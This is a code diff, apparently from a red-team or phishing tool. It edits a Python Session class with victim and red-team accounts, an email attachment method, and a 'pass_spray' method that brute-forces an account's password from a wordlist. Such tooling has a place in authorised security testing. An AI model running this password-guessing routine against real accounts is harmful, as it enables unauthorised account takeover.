@@ -79,7 +79,9 @@ class Session:
         self.emails            = []
 
         self._validated_cred   = False
-        self._victim_account   = self.set_vic_account()
+
+        if password != '':
+            self._victim_account   = self.set_vic_account()
 
         if(Session.red_username == ''):
             Session.set_red_account()
@@ -99,20 +101,21 @@ class Session:
             self._validated_cred = False
         return account
 
-    def pass_spray(self, pass_file):
+    def pass_spray(self, username, pass_file):
         """Use a password file to try to brute force the given account.
 
         :param username:  (string)  The username of the account to be bruteforced
         :param pass_file: (string)  The filename of the password list to use
 
         :return:          (Boolean) Whether or not password was succesfully bruteforced.
+        :return:          (String)  The password if it was successful, None otherwise
         """
 
         found = False
         with open(pass_file) as pass_list:
             count = 1
             for password in pass_list:
-                valid = self.test_single_mode(self.username, domain, password.rstrip('\r\n'))
+                valid, account = self.test_single_mode(self.username, self.domain, password.rstrip('\r\n'))
                 if valid:
                     found = True
                     print(username + "'s password is: " + password)
@@ -120,13 +123,13 @@ class Session:
                     # update objects
                     self.password        = password
                     self._validated_cred = True
-                    return True
+                    return True, password
 
                 else:
-                    print(str(count) + 'Password: ' + password + ' Failed')
+                    print(str(count) + ' Password: ' + password + ' Failed')
 
                 count+=1
-        return False
+        return False, None
 
     def attach_file(self, message, file_path, file_name):
         """Attaches a given file to a given message, and names as specified.
